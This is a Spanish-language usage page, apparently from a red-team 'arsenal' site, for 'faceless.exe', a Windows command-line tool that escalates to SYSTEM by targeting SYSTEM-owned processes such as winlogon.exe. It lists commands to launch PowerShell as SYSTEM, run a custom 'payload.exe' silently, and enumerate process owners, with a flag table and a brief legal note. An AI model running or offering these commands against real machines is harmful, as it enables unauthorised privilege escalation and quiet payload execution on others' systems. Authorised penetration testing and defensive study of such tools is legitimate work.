---
title: "Usage"
description: "Referencia rapida de comandos y flujo general."
tags: ["usage", "cli"]
order: 6
lastUpdated: 2026-02-06
---

## Referencia rapida

```bash
faceless.exe --help              # Show help
faceless.exe list                # List all processes
faceless.exe list explorer       # Filter by name
faceless.exe --system            # Auto-escalate to SYSTEM
faceless.exe -p 1234             # Target specific PID
faceless.exe -n winlogon.exe     # Target by name
faceless.exe --system -q         # Silent mode
```

## Ejemplos

Escalar a SYSTEM:

```bash
faceless.exe --system
```

Ejecutar PowerShell como SYSTEM:

```bash
faceless.exe --system -c powershell.exe
```

Ejecutar un binario custom en silencio:

```bash
faceless.exe --system -c "C:\payload.exe" -q
```

Enumeracion de procesos:

```bash
faceless.exe list
```

Salida esperada:

```
================================================================================
     PID | Process                      | Owner
================================================================================
     668 | winlogon.exe                 | NT AUTHORITY\SYSTEM
     712 | services.exe                 | NT AUTHORITY\SYSTEM
    9180 | explorer.exe                 | DESKTOP\User
================================================================================
```

## Opciones CLI

| Opcion | Descripcion |
|--------|-------------|
| `list [filter]` | Enumerar procesos (filtro opcional por nombre) |
| `-p, --pid <PID>` | Target por PID |
| `-n, --name <name>` | Target por nombre |
| `--system` | Auto-target a proceso SYSTEM |
| `-c, --cmd <command>` | Comando a ejecutar (por defecto `cmd.exe`) |
| `-q, --quiet` | Suprime salida |
| `-h, --help` | Mostrar ayuda |

## Flujo recomendado

1. Enumerar procesos y validar contexto.
2. Seleccionar objetivo autorizado (PID o nombre).
3. Ejecutar con modo silencioso cuando aplique.

## Nota legal

- Usa estas opciones solo en sistemas propios o con permiso escrito.

## Ver tambien

- [Installation](/es/arsenal/faceless/setup)
- [OPSEC](/es/arsenal/faceless/opsec)
